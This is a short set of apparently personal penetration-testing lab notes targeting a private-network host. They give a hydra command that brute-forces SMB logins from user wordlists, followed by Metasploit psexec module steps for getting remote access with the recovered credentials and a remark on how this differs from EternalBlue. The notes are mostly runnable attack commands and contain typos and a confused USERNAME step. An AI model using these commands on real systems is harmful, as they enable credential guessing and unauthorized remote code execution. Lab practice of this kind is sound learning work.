# we can exploit smb if we know the credentials of the system 

hydra -L unix_users.txt -P unix_user.txt 192.168.56.3 smb

# Once we the creds from the hydra we can use psexec module from the metaslpoit module to get access to the system

search psexec

set RHOSTS 192.168.56.3

set USERNAME administrator or vagrant

set USERNAME vagrant #for both usernames

exploit # the difference between eternal blue and psexec is this  method can be implemented even if the smb version is upgraded
